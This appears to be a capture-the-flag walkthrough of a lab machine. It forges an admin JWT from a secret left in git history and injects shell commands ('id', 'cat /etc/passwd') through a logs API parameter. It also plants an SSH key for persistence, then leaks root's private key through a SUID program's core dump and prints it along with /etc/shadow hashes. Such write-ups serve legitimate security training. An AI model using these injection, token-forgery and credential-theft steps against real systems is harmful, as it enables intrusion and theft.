IP address - 10.10.11.120

*private.js* (in source code)
 ```
   if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
```

`curl -i -X POST \
  -H 'Content-Type: application/json' \
  -d '{"name":"drtuser", "email":"drt@dasith.works", "password":"sexyasspassword"}' \
  http://10.10.11.120/api/user/register`
  ```
  HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 31 Dec 2021 01:40:57 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 18
Connection: keep-alive
X-Powered-By: Express
ETag: W/"12-k5hukY9+41w+i14cXsKJcLytzTY"

{"user":"drtuser"}                                                                                                   
```
`curl -i -X POST \
  -H 'Content-Type: application/json' \
  -d '{"email":"drt@dasith.works", "password":"sexyasspassword"}' \
  http://10.10.11.120/api/user/login`
  ```
  HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 31 Dec 2021 01:42:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 208
Connection: keep-alive
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWNlNWZhOTkzMGQ1NjA0NWU1NWIyNDYiLCJuYW1lIjoiZHJ0dXNlciIsImVtYWlsIjoiZHJ0QGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDkxNDk2NX0.8R7V-tTsaDUhIz6wP4VbQQLOXYAZHavsLJicWfO0tWc
ETag: W/"d0-VS7eSXxnVHnPG+Iy8r/RnIYJbPQ"

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWNlNWZhOTkzMGQ1NjA0NWU1NWIyNDYiLCJuYW1lIjoiZHJ0dXNlciIsImVtYWlsIjoiZHJ0QGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDkxNDk2NX0.8R7V-tTsaDUhIz6wP4VbQQLOXYAZHavsLJicWfO0tWc                          
```
`git log`
```
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530
```
`git diff HEAD~2`
```
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
diff --git a/routes/private.js b/routes/private.js
index 1347e8c..cf6bf21 100644
--- a/routes/private.js
+++ b/routes/private.js
@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) => {
     
     if (name == 'theadmin'){
         res.json({
-            role:{
-
-                role:"you are admin", 
-                desc : "{flag will be here}"
```
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWNlNWZhOTkzMGQ1NjA0NWU1NWIyNDYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDA5MTQ5NjV9.RCpH5FVRB-4XcV9J20nEa2JXxyyxoV3t9iN-h53kZjc`

curl -i \
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \
  'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
```
"ab3e953 Added the codes
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dasith:x:1000:1000:dasith:/home/dasith:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin
```

`ssh-keygen -t rsa -b 4096 -C 'drt@htb' -f secret.htb -P ''`
`mkdir -p /home/dasith/.ssh`
`export PUBLIC_KEY=$(cat secret.htb.pub)`
`echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys`

`curl \
  -i \                
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \ 
  -G \                                               
  --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \                         
  'http://10.10.11.120/api/logs' ` - storing our public ssh key into the system machine, using the JSON Web token 
  
  `ssh -i secret.htb dasith@10.10.11.120` - Gaining a shell as dasith
  *User.txt* - `f85e28b2d5a9172e21c072704f9f7c37`
  ##### Low level user (dasith)
  
  *Finding SUID binaries on system* - `find / -perm -u=s -type f 2>/dev/null`
  Found `/opt/count` - interesting
  **Linux core dumping**
  `apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report`
  `strings /tmp/crash-report/CoreDump`
  root.txt - `e3bbd093cbc7b5f4764c7be3f96bf595`
  *Gaining a shell*
  ```
  ./count
  (type /root/.ssh/id_rsa) - then ctrl-z the process to foreground it\
  ps (find the process running)
  kill -BUS 1839
  apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash1
  strings /tmp/crash1/Coredump
  ```
  ```
  -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
(Pasting the private ssh key into *secret.root on attacking box*)
```
chmod 600 secret.root

ssh -i secret.root root@10.10.11.120

```
(Shell access)
`cat /etc/shadow`
```
root:$6$/0f5J.S8.u.dA78h$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18852:0:99999:7:::
sshd:*:18852:0:99999:7:::
systemd-coredump:!!:18852::::::
dasith:$6$RM7seX/Mzkds2S1x$.vkOBt4kRfs/6JRApNqvzZ1zM6W1FK8kNKyoBOVSuZbrdlOw.vPj2D7VC0y0sz2Eg2z5rj.GdK2ApMBFynjmR/:18873:0:99999:7:::
lxd:!:18852::::::
mongodb:!:18852:0:99999:7:::
```
